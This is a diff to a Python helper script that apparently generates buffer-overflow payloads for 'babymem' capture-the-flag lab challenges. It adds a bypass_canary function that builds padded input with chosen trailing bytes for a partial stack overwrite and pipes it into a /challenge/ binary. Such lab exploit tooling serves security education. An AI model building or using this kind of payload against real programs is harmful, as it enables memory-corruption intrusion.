@@ -42,3 +42,10 @@ def babymem_5_0():
 
 def babymem_5_1():
     fast_payload_gen(136, 0x401453, 'babymem_level5.1', int_of = True)
+
+def bypass_canary(max_n, pre_len, target_n, byte1, byte2, challenge):
+    cmd = 'printf "' + str(max_n) + '\\n'
+    for i in range(0, pre_len):
+        cmd = cmd + 'a'
+    cmd = cmd + target_n + byte1 + byte2 + '" | /challenge/' + challenge
+    print(cmd)
